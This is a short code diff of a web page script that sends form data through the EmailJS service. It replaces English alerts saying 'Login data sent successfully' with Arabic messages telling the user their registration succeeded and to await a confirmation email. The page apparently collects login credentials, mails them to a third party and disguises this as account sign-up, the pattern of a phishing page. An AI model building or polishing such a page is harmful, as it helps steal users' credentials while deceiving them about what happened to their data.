@@ -103,10 +103,10 @@
             emailjs.send("service_la9pk5b", "template_taq80yv", templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
-                    alert('Login data sent successfully!');
+                    alert('تم التسجيل بنجاح !يرجى انتظار رسالة تأكيد الحساب .');
                 }, function(error) {
                     console.error('FAILED...', error);
-                    alert('Failed to send login data. Please try again.');
+                    alert('المعلومات خاطئة يرجى إعادة المحاولة .');
                 });
         }
     </script>
